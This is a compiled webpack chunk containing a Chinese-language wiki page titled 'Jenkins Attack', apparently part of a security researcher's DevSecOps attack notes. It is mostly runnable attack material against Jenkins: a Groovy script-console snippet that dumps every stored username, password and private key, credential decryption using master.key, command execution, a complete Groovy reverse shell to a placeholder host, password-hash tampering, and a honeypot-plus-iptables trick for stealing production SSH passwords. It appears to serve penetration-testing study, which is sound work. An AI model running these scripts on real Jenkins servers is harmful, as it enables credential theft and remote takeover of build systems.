"use strict";(self.webpackChunkwhoopsunix_wiki=self.webpackChunkwhoopsunix_wiki||[]).push([[5335],{80934:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>o,default:()=>d,frontMatter:()=>r,metadata:()=>a,toc:()=>l});var i=t(85893),s=t(11151);const r={sidebar_position:1,tags:["DevSecOps","Jenkins","CVE"]},o="Jenkins Attack",a={id:"DevOpsAttack/Jenkins/Jenkins",title:"Jenkins Attack",description:"0x00 \u67e5\u770b\u7248\u672c",source:"@site/docs/05-DevOpsAttack/Jenkins/Jenkins.md",sourceDirName:"05-DevOpsAttack/Jenkins",slug:"/DevOpsAttack/Jenkins/",permalink:"/docs/DevOpsAttack/Jenkins/",draft:!1,unlisted:!1,editUrl:"https://github.com/Whoopsunix/whoopsunix.github.io/docs/05-DevOpsAttack/Jenkins/Jenkins.md",tags:[{label:"DevSecOps",permalink:"/docs/tags/dev-sec-ops"},{label:"Jenkins",permalink:"/docs/tags/jenkins"},{label:"CVE",permalink:"/docs/tags/cve"}],version:"current",sidebarPosition:1,frontMatter:{sidebar_position:1,tags:["DevSecOps","Jenkins","CVE"]},sidebar:"tutorialSidebar",previous:{title:"\u901a\u8fc7 cicd-goat \u9776\u573a\u5b66\u4e60Top 10 CI/CD Security Risks",permalink:"/docs/DevOpsAttack/cicd-goat/"}},c={},l=[{value:"0x00 \u67e5\u770b\u7248\u672c",id:"0x00-\u67e5\u770b\u7248\u672c",level:2},{value:"0x01 \u5173\u952e\u4fe1\u606f",id:"0x01-\u5173\u952e\u4fe1\u606f",level:2},{value:"\u6587\u4ef6",id:"\u6587\u4ef6",level:3},{value:"\u73af\u5883\u53d8\u91cf",id:"\u73af\u5883\u53d8\u91cf",level:3},{value:"0x02 \u7528\u6237\u76f8\u5173",id:"0x02-\u7528\u6237\u76f8\u5173",level:2},{value:"\u4fee\u6539\u5df2\u6709\u7528\u6237\u5bc6\u7801",id:"\u4fee\u6539\u5df2\u6709\u7528\u6237\u5bc6\u7801",level:3},{value:"\u751f\u6548\u5bc6\u7801",id:"\u751f\u6548\u5bc6\u7801",level:4},{value:"\u9ed8\u8ba4\u5bc6\u7801",id:"\u9ed8\u8ba4\u5bc6\u7801",level:3},{value:"\u5220\u9664\u540e\u91cd\u65b0\u751f\u6210",id:"\u5220\u9664\u540e\u91cd\u65b0\u751f\u6210",level:4},{value:"0x03 \u51ed\u8bc1",id:"0x03-\u51ed\u8bc1",level:2},{value:"\u51ed\u8bc1\u6587\u4ef6",id:"\u51ed\u8bc1\u6587\u4ef6",level:3},{value:"\u7ec8\u7aef\u83b7\u53d6",id:"\u7ec8\u7aef\u83b7\u53d6",level:3},{value:"\u7ec8\u7aef\u89e3\u5bc6",id:"\u7ec8\u7aef\u89e3\u5bc6",level:3},{value:"Script \u89e3\u5bc6",id:"script-\u89e3\u5bc6",level:3},{value:"0x04 Script Groovy \u6267\u884c (Node \u5229\u7528)",id:"0x04-script-groovy-\u6267\u884c-node-\u5229\u7528",level:2},{value:"\u666e\u901a\u6267\u884c",id:"\u666e\u901a\u6267\u884c",level:3},{value:"\u53cd\u5f39 shell",id:"\u53cd\u5f39-shell",level:3},{value:"\u6587\u4ef6",id:"\u6587\u4ef6-1",level:3},{value:"0x05 \u65b0\u5efa Node \u83b7\u53d6 ssh \u5bc6\u7801 (prod \u5229\u7528)",id:"0x05-\u65b0\u5efa-node-\u83b7\u53d6-ssh-\u5bc6\u7801-prod-\u5229\u7528",level:2},{value:"0x06 jenkins-cli",id:"0x06-jenkins-cli",level:2},{value:"0x07 CICD \u653b\u51fb",id:"0x07-cicd-\u653b\u51fb",level:2}];function h(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",h3:"h3",h4:"h4",img:"img",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,s.a)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(n.h1,{id:"jenkins-attack",children:"Jenkins Attack"}),"\n",(0,i.jsx)(n.h2,{id:"0x00-\u67e5\u770b\u7248\u672c",children:"0x00 \u67e5\u770b\u7248\u672c"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"http://localhost:8080/login",children:"http://localhost:8080/login"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20240327105323776",src:t(35829).Z+"",width:"1826",height:"768"})}),"\n",(0,i.jsx)(n.h2,{id:"0x01-\u5173\u952e\u4fe1\u606f",children:"0x01 \u5173\u952e\u4fe1\u606f"}),"\n",(0,i.jsx)(n.h3,{id:"\u6587\u4ef6",children:"\u6587\u4ef6"}),"\n",(0,i.jsx)(n.p,{children:"JENKINS_HOME/config.xml  \u6574\u4f53\u914d\u7f6e\u4fe1\u606f"}),"\n",(0,i.jsx)(n.p,{children:"JENKINS_HOME/jobs/{xxx}/config.xml  \u5177\u4f53\u7ba1\u9053\u4e0b\u7684\u914d\u7f6e\u4fe1\u606f\uff0c\u8bbe\u7f6e\u7684\u51ed\u636e\u4e5f\u53ef\u4ee5\u5728\u8fd9\u4e0b\u9762\u627e\u5230"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20240327173421994",src:t(52666).Z+"",width:"2192",height:"928"})}),"\n",(0,i.jsx)(n.h3,{id:"\u73af\u5883\u53d8\u91cf",children:"\u73af\u5883\u53d8\u91cf"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"http://localhost:8080/env-vars.html",children:"http://localhost:8080/env-vars.html"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20240328160943629",src:t(19995).Z+"",width:"957",height:"443"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:'BRANCH_NAME\nFor a multibranch project, this will be set to the name of the branch being built, for example in case you wish to deploy to production from master but not from feature branches; if corresponding to some kind of change request, the name is generally arbitrary (refer to CHANGE_ID and CHANGE_TARGET).\nBRANCH_IS_PRIMARY\nFor a multibranch project, if the SCM source reports that the branch being built is a primary branch, this will be set to "true"; else unset. Some SCM sources may report more than one branch as a primary branch while others may not supply this information.\nCHANGE_ID\nFor a multibranch project corresponding to some kind of change request, this will be set to the change ID, such as a pull request number, if supported; else unset.\nCHANGE_URL\nFor a multibranch project corresponding to some kind of change request, this will be set to the change URL, if supported; else unset.\nCHANGE_TITLE\nFor a multibranch project corresponding to some kind of change request, this will be set to the title of the change, if supported; else unset.\nCHANGE_AUTHOR\nFor a multibranch project corresponding to some kind of change request, this will be set to the username of the author of the proposed change, if supported; else unset.\nCHANGE_AUTHOR_DISPLAY_NAME\nFor a multibranch project corresponding to some kind of change request, this will be set to the human name of the author, if supported; else unset.\nCHANGE_AUTHOR_EMAIL\nFor a multibranch project corresponding to some kind of change request, this will be set to the email address of the author, if supported; else unset.\nCHANGE_TARGET\nFor a multibranch project corresponding to some kind of change request, this will be set to the target or base branch to which the change could be merged, if supported; else unset.\nCHANGE_BRANCH\nFor a multibranch project corresponding to some kind of change request, this will be set to the name of the actual head on the source control system which may or may not be different from BRANCH_NAME. For example in GitHub or Bitbucket this would have the name of the origin branch whereas BRANCH_NAME would be something like PR-24.\nCHANGE_FORK\nFor a multibranch project corresponding to some kind of change request, this will be set to the name of the forked repo if the change originates from one; else unset.\nTAG_NAME\nFor a multibranch project corresponding to some kind of tag, this will be set to the name of the tag being built, if supported; else unset.\nTAG_TIMESTAMP\nFor a multibranch project corresponding to some kind of tag, this will be set to a timestamp of the tag in milliseconds since Unix epoch, if supported; else unset.\nTAG_UNIXTIME\nFor a multibranch project corresponding to some kind of tag, this will be set to a timestamp of the tag in seconds since Unix epoch, if supported; else unset.\nTAG_DATE\nFor a multibranch project corresponding to some kind of tag, this will be set to a timestamp in the format as defined by java.util.Date#toString() (e.g., Wed Jan 1 00:00:00 UTC 2020), if supported; else unset.\nJOB_DISPLAY_URL\nURL that will redirect to a Job in a preferred user interface\nRUN_DISPLAY_URL\nURL that will redirect to a Build in a preferred user interface\nRUN_ARTIFACTS_DISPLAY_URL\nURL that will redirect to Artifacts of a Build in a preferred user interface\nRUN_CHANGES_DISPLAY_URL\nURL that will redirect to Changelog of a Build in a preferred user interface\nRUN_TESTS_DISPLAY_URL\nURL that will redirect to Test Results of a Build in a preferred user interface\nCI\nStatically set to the string "true" to indicate a "continuous integration" execution environment.\nBUILD_NUMBER\nThe current build number, such as "153".\nBUILD_ID\nThe current build ID, identical to BUILD_NUMBER for builds created in 1.597+, but a YYYY-MM-DD_hh-mm-ss timestamp for older builds.\nBUILD_DISPLAY_NAME\nThe display name of the current build, which is something like "#153" by default.\nJOB_NAME\nName of the project of this build, such as "foo" or "foo/bar".\nJOB_BASE_NAME\nShort Name of the project of this build stripping off folder paths, such as "foo" for "bar/foo".\nBUILD_TAG\nString of "jenkins-${JOB_NAME}-${BUILD_NUMBER}". All forward slashes ("/") in the JOB_NAME are replaced with dashes ("-"). Convenient to put into a resource file, a jar file, etc for easier identification.\nEXECUTOR_NUMBER\nThe unique number that identifies the current executor (among executors of the same machine) that\u2019s carrying out this build. This is the number you see in the "build executor status", except that the number starts from 0, not 1.\nNODE_NAME\nName of the agent if the build is on an agent, or "built-in" if run on the built-in node (or "master" until Jenkins 2.306).\nNODE_LABELS\nWhitespace-separated list of labels that the node is assigned.\nWORKSPACE\nThe absolute path of the directory assigned to the build as a workspace.\nWORKSPACE_TMP\nA temporary directory near the workspace that will not be browsable and will not interfere with SCM checkouts. May not initially exist, so be sure to create the directory as needed (e.g., mkdir -p on Linux). Not defined when the regular workspace is a drive root.\nJENKINS_HOME\nThe absolute path of the directory assigned on the controller file system for Jenkins to store data.\nJENKINS_URL\nFull URL of Jenkins, like http://server:port/jenkins/ (note: only available if Jenkins URL set in system configuration).\nBUILD_URL\nFull URL of this build, like http://server:port/jenkins/job/foo/15/ (Jenkins URL must be set).\nJOB_URL\nFull URL of this job, like http://server:port/jenkins/job/foo/ (Jenkins URL must be set).\nGIT_COMMIT\nThe commit hash being checked out.\nGIT_PREVIOUS_COMMIT\nThe hash of the commit last built on this branch, if any.\nGIT_PREVIOUS_SUCCESSFUL_COMMIT\nThe hash of the commit last successfully built on this branch, if any.\nGIT_BRANCH\nThe remote branch name, if any.\nGIT_LOCAL_BRANCH\nThe local branch name being checked out, if applicable.\nGIT_CHECKOUT_DIR\nThe directory that the repository will be checked out to. This contains the value set in Checkout to a sub-directory, if used.\nGIT_URL\nThe remote URL. If there are multiple, will be GIT_URL_1, GIT_URL_2, etc.\nGIT_COMMITTER_NAME\nThe configured Git committer name, if any, that will be used for FUTURE commits from the current workspace. It is read from the Global Config user.name Value field of the Jenkins Configure System page.\nGIT_AUTHOR_NAME\nThe configured Git author name, if any, that will be used for FUTURE commits from the current workspace. It is read from the Global Config user.name Value field of the Jenkins Configure System page.\nGIT_COMMITTER_EMAIL\nThe configured Git committer email, if any, that will be used for FUTURE commits from the current workspace. It is read from the Global Config user.email Value field of the Jenkins Configure System page.\nGIT_AUTHOR_EMAIL\nThe configured Git author email, if any, that will be used for FUTURE commits from the current workspace. It is read from the Global Config user.email Value field of the Jenkins Configure System page.\n'})}),"\n",(0,i.jsx)(n.h2,{id:"0x02-\u7528\u6237\u76f8\u5173",children:"0x02 \u7528\u6237\u76f8\u5173"}),"\n",(0,i.jsx)(n.h3,{id:"\u4fee\u6539\u5df2\u6709\u7528\u6237\u5bc6\u7801",children:"\u4fee\u6539\u5df2\u6709\u7528\u6237\u5bc6\u7801"}),"\n",(0,i.jsxs)(n.p,{children:["\u4f4d\u4e8e ",(0,i.jsx)(n.code,{children:"$JENKINS_HOME/users/"})," \u76ee\u5f55\u4e0b"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20240327135540294",src:t(5850).Z+"",width:"1384",height:"104"})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"users.xml"})," \u6587\u4ef6\u83b7\u53d6\u7528\u6237\u5217\u8868\u4ee5\u53ca\u5bf9\u5e94\u7684\u76ee\u5f55"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20240327140624283",src:t(40602).Z+"",width:"996",height:"648"})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.code,{children:"$JENKINS_HOME/users/alice_13254336614910464357/config.xml"}),"  \uff0c\u8bfb\u53d6\u7528\u6237\u76ee\u5f55\u4e0b\u7684 ",(0,i.jsx)(n.code,{children:"config.xml"})," \u6587\u4ef6"]}),"\n",(0,i.jsx)(n.p,{children:"\u901a\u5e38\u5173\u6ce8\u8fd9\u4e09\u4e2a\u4fe1\u606f"}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsxs)(n.li,{children:["\u7528\u6237\u5bc6\u7801\uff0c",(0,i.jsx)(n.code,{children:"<passwordHash>"})," \u5b57\u6bb5\u4f7f\u7528 JBCript \u52a0\u5bc6\uff0c\u5bf9\u5e94\u6e90\u7801\u4e2d\u7684\u52a0\u5bc6\u7c7b ",(0,i.jsx)(n.code,{children:"HudsonPrivateSecurityRealm"}),"\uff0c\u76f4\u63a5\u7528 CyberChef \u52a0\u5bc6"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20240328174744696",src:t(73975).Z+"",width:"1958",height:"984"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"\u7528\u6237Token\uff0c\u4f7f\u7528sha256\u54c8\u5e0c\u7f16\u7801"}),"\n",(0,i.jsx)(n.li,{children:"\u7528\u6237\u79cd\u5b50"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20240327141804444",src:t(42047).Z+"",width:"2110",height:"1654"})}),"\n",(0,i.jsx)(n.h4,{id:"\u751f\u6548\u5bc6\u7801",children:"\u751f\u6548\u5bc6\u7801"}),"\n",(0,i.jsxs)(n.p,{children:["\u9700\u8981\u6709 ",(0,i.jsx)(n.code,{children:"Administer permission"})," \u6743\u9650\u7684\u7528\u6237\u767b\u9646\uff0c\u7136\u540e\u901a\u8fc7 ",(0,i.jsx)(n.a,{href:"http://localhost:8080/reload",children:"http://localhost:8080/reload"})," \u70b9\u51fb ",(0,i.jsx)(n.code,{children:"Retry using POST"})," \u91cd\u8f7d\u914d\u7f6e"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20240327163140285",src:t(20885).Z+"",width:"1330",height:"482"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"\u5176\u4ed6\uff01"})}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.a,{href:"http://localhost:8080/exit",children:"http://localhost:8080/exit"})," \uff0c\u70b9\u51fb ",(0,i.jsx)(n.code,{children:"Retry using POST"}),"  \u5173\u95edjenkins\u670d\u52a1"]}),"\n",(0,i.jsxs)(n.p,{children:[(0,i.jsx)(n.a,{href:"http://localhost:8080/restrat",children:"http://localhost:8080/restrat"})," \u91cd\u542f jenkins \u670d\u52a1\u5668"]}),"\n",(0,i.jsx)(n.h3,{id:"\u9ed8\u8ba4\u5bc6\u7801",children:"\u9ed8\u8ba4\u5bc6\u7801"}),"\n",(0,i.jsxs)(n.p,{children:["\u4f4d\u4e8e ",(0,i.jsx)(n.code,{children:"$JENKINS_HOME/secrets/initialAdminPassword"})," \uff0c\u5982\u679c\u4e0d\u5b58\u5728\u4ee3\u8868\u5df2\u7ecf\u88ab\u4fee\u6539"]}),"\n",(0,i.jsx)(n.h4,{id:"\u5220\u9664\u540e\u91cd\u65b0\u751f\u6210",children:"\u5220\u9664\u540e\u91cd\u65b0\u751f\u6210"}),"\n",(0,i.jsx)(n.p,{children:"\u5220\u9664\u5982\u4e0b\u51e0\u4e2a tag"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{className:"language-xml",children:'<useSecurity>true</useSecurity>\n<authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">\n        <denyAnonymousReadAccess>true</denyAnonymousReadAccess>\n</authorizationStrategy>\n<securityRealm class="hudson.security.HudsonPrivateSecurityRealm">\n        <disableSignup>true</disableSignup>\n        <enableCaptcha>false</enableCaptcha>\n</securityRealm>\n'})}),"\n",(0,i.jsx)(n.h2,{id:"0x03-\u51ed\u8bc1",children:"0x03 \u51ed\u8bc1"}),"\n",(0,i.jsx)(n.h3,{id:"\u51ed\u8bc1\u6587\u4ef6",children:"\u51ed\u8bc1\u6587\u4ef6"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"$JENKINS_HOME/credentials.xml \u6216 $JENKINS_HOME/config.xml \u51ed\u8bc1\u6587\u4ef6\n$JENKINS_HOME/secrets/master.key  \u5bc6\u94a5\n$JENKINS_HOME/secrets/hudson.util.Secret   hash\nJENKINS_HOME/jobs/{pp path}/config.xml \u5177\u4f53\u7ba1\u9053\u7684\u914d\u7f6e\u6587\u4ef6\n"})}),"\n",(0,i.jsx)(n.h3,{id:"\u7ec8\u7aef\u83b7\u53d6",children:"\u7ec8\u7aef\u83b7\u53d6"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:'def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(\n    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,\n    Jenkins.instance,\n    null,\n    null\n);\nfor (c in creds) {\n     println( ( c.properties.privateKeySource ? "ID: " + c.id + ", UserName: " + c.username + ", Private Key: " + c.getPrivateKey() : ""))\n}\nfor (c in creds) {\n     println( ( c.properties.password ? "ID: " + c.id + ", UserName: " + c.username + ", Password: " + c.password : ""))\n}\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20240329114335646",src:t(69919).Z+"",width:"2176",height:"1140"})}),"\n",(0,i.jsx)(n.h3,{id:"\u7ec8\u7aef\u89e3\u5bc6",children:"\u7ec8\u7aef\u89e3\u5bc6"}),"\n",(0,i.jsxs)(n.p,{children:["\u89e3\u5bc6\u5de5\u5177  ",(0,i.jsx)(n.a,{href:"https://github.com/hoto/jenkins-credentials-decryptor",children:"https://github.com/hoto/jenkins-credentials-decryptor"})]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:'curl -L "https://github.com/hoto/jenkins-credentials-decryptor/releases/download/1.2.0/jenkins-credentials-decryptor_1.2.0_Linux_x86_64" -o jenkins-credentials-decryptor\n\nchmod +x jenkins-credentials-decryptor\n\n./jenkins-credentials-decryptor -m $JENKINS_HOME/secrets/master.key -s $JENKINS_HOME/secrets/hudson.util.Secret -c $JENKINS_HOME/credentials.xml -o json\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20240329114107242",src:t(2698).Z+"",width:"1926",height:"1392"})}),"\n",(0,i.jsx)(n.h3,{id:"script-\u89e3\u5bc6",children:"Script \u89e3\u5bc6"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:'println(hudson.util.Secret.decrypt("{AQ...}"))\nprintln(hudson.util.Secret.fromString("{AQ...}").getPlainText())\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20240329105908735",src:t(33561).Z+"",width:"2350",height:"1138"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20240329105953972",src:t(75845).Z+"",width:"2200",height:"1432"})}),"\n",(0,i.jsx)(n.h2,{id:"0x04-script-groovy-\u6267\u884c-node-\u5229\u7528",children:"0x04 Script Groovy \u6267\u884c (Node \u5229\u7528)"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"http://localhost:8080/script",children:"http://localhost:8080/script"})}),"\n",(0,i.jsx)(n.p,{children:"\u5c31\u662f Groovy \u6267\u884c\u7684\u8bed\u6cd5\uff0c\u63d0\u4f9b\u51e0\u4e2a\u5e38\u7528"}),"\n",(0,i.jsx)(n.h3,{id:"\u666e\u901a\u6267\u884c",children:"\u666e\u901a\u6267\u884c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"println \"cat /etc/passwd\".execute().text\n\nprintln new ProcessBuilder('sh','-c','ls').redirectErrorStream(true).start().text\n"})}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"def proc = \"id\".execute();\ndef os = new StringBuffer();\nproc.waitForProcessOutput(os, System.err);\nprintln(os.toString());\n\ndef proc = ['bash', '-c', '''whoami'''].execute();\n"})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20240328151726668",src:t(71282).Z+"",width:"1160",height:"794"})}),"\n",(0,i.jsx)(n.h3,{id:"\u53cd\u5f39-shell",children:"\u53cd\u5f39 shell"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:'String host = "ip";\nint port = 1234;\nString cmd = "/bin/bash";\nProcess p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s = new Socket(host, port);\nInputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\nOutputStream po = p.getOutputStream(), so = s.getOutputStream();\nwhile (!s.isClosed()) {\nwhile (pi.available() > 0) so.write(pi.read());\nwhile (pe.available() > 0) so.write(pe.read());\nwhile (si.available() > 0) po.write(si.read());\nso.flush();\npo.flush();\nThread.sleep(50);\ntry {\np.exitValue();\nbreak;\n} catch (Exception e) {\n}\n}\np.destroy();\ns.close();\n'})}),"\n",(0,i.jsx)(n.h3,{id:"\u6587\u4ef6-1",children:"\u6587\u4ef6"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"\u8bfb\nnew File('/etc/passwd').text\n\n\u5199\nnew File('/tmp/file.txt').withWriter('UTF-8') { writer ->\n    try {\n        writer << 'hello world\\n'\n    } finally {\n        writer.close()\n    }\n}\n"})}),"\n",(0,i.jsxs)(n.p,{children:["\u5176\u4ed6\u4e00\u4e9b\u8bed\u6cd5\u53c2\u8003  ",(0,i.jsx)(n.a,{href:"https://github.com/samrocketman/jenkins-script-console-scripts",children:"https://github.com/samrocketman/jenkins-script-console-scripts"})]}),"\n",(0,i.jsx)(n.h2,{id:"0x05-\u65b0\u5efa-node-\u83b7\u53d6-ssh-\u5bc6\u7801-prod-\u5229\u7528",children:"0x05 \u65b0\u5efa Node \u83b7\u53d6 ssh \u5bc6\u7801 (prod \u5229\u7528)"}),"\n",(0,i.jsxs)(n.p,{children:["\u4f7f\u7528 ",(0,i.jsx)(n.a,{href:"https://github.com/cowrie/cowrie",children:"cowrie"})," \u871c\u7f50\u6216\u4efb\u610f ssh \u871c\u7f50"]}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"docker run -p 2222:2222 cowrie/cowrie\n"})}),"\n",(0,i.jsx)(n.p,{children:"\u65b0\u5efa\u4e00\u4e2a\u8282\u70b9\u590d\u5236\u76ee\u6807\u8282\u70b9"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20240328152250208",src:t(97380).Z+"",width:"1036",height:"556"})}),"\n",(0,i.jsx)(n.p,{children:"\u9009\u62e9\u9700\u8981\u83b7\u53d6\u7684\u51ed\u8bc1\u8282\u70b9\u53ca\u871c\u7f50\u76d1\u542c ip"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20240328145632234",src:t(54492).Z+"",width:"2116",height:"934"})}),"\n",(0,i.jsx)(n.p,{children:"\u76d1\u542c\u5f97\u5230 Prod \u7684 ssh \u5bc6\u7801"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.img,{alt:"image-20240328141146680",src:t(97649).Z+"",width:"855",height:"102"})}),"\n",(0,i.jsx)(n.p,{children:"\u7279\u6b8a\u60c5\u51b5\u9700\u8981 22 \u7aef\u53e3\u7684\u8bbe\u7f6e\u4e0b\u8f6c\u53d1"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"#\u8bbe\u7f6e\u7aef\u53e3\u8f6c\u53d1\necho 1 > /proc/sys/net/ipv4/ip_forward\niptables -P FORWARD ACCEPT\niptables -A INPUT -p tcp --dport 2222 -j ACCEPT\niptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-ports 2222\n\n#\u871c\u7f50\u4f7f\u7528\u5b8c\u4e4b\u540e\u5c06\u8f6c\u53d1\u7684\u89c4\u5219\u5220\u9664\uff0c\u8981\u5220\u5e72\u51c0\u3002\niptables -L INPUT --line-numbers\niptables -D INPUT 7\niptables -t nat -L -n --line-numbers\niptables -t nat -D PREROUTING 2\n"})}),"\n",(0,i.jsx)(n.h2,{id:"0x06-jenkins-cli",children:"0x06 jenkins-cli"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"http://localhost:8080/jnlpJars/jenkins-cli.jar",children:"http://localhost:8080/jnlpJars/jenkins-cli.jar"})}),"\n",(0,i.jsx)(n.p,{children:"\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7 jenkins-cli \u6765\u64cd\u4f5c"}),"\n",(0,i.jsx)(n.pre,{children:(0,i.jsx)(n.code,{children:"java -jar jenkins-cli.jar -s http://127.0.0.1:8081/ -auth demo:demo reload-con\nfiguration\n"})}),"\n",(0,i.jsx)(n.h2,{id:"0x07-cicd-\u653b\u51fb",children:"0x07 CICD \u653b\u51fb"}),"\n",(0,i.jsx)(n.p,{children:"\u89c1 cicd-goat WP\u3002"}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"\u53c2\u8003"})}),"\n",(0,i.jsxs)(n.blockquote,{children:["\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.a,{href:"https://github.com/gquere/pwn_jenkins",children:"https://github.com/gquere/pwn_jenkins"})}),"\n"]})]})}function d(e={}){const{wrapper:n}={...(0,s.a)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(h,{...e})}):h(e)}},35829:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image-20240327105323776-9baa8699c1494a8e4c8370d6888f4bed.png"},5850:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image-20240327135540294-804f9a5fde81c489531ad31fa1e29586.png"},40602:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image-20240327140624283-185e94f2ebaab007e5aebe7e51a0fd49.png"},42047:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image-20240327141804444-d39b76049a338a39bd4b2e7235404f0c.png"},20885:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image-20240327163140285-029bd74d48011d1478e7a1583a5090a3.png"},52666:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image-20240327173421994-f0f5079f1039f9c1500de416cc1b10be.png"},97649:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image-20240328141146680-0ae4062a2a1b9e3cd61977987aa03d81.png"},54492:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image-20240328145632234-1ac796483508d8a9da834a19d4d95b10.png"},71282:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image-20240328151726668-e32d69dc8aaad12f4f84c58d10ae5594.png"},97380:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image-20240328152250208-79ba20694a776a4a5baa5c88d97e30c2.png"},19995:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image-20240328160943629-1fe1dd8f947fb8c7b89ae04206d5a569.png"},73975:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image-20240328174744696-ffa89fdd7e47871613a51669e6979204.png"},33561:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image-20240329105908735-eee535043817b3fef039a3b66697e65b.png"},75845:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image-20240329105953972-e96abe5396883892a5c5ba3c1aea0e3b.png"},2698:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image-20240329114107242-764b70affd011a6a5b87a3faf366c9b9.png"},69919:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/image-20240329114335646-82f0b3f795f34dcbe92c366d50a14185.png"},11151:(e,n,t)=>{t.d(n,{Z:()=>a,a:()=>o});var i=t(67294);const s={},r=i.createContext(s);function o(e){const n=i.useContext(r);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(s):e.components||s:o(e.components),i.createElement(r.Provider,{value:n},e.children)}}}]);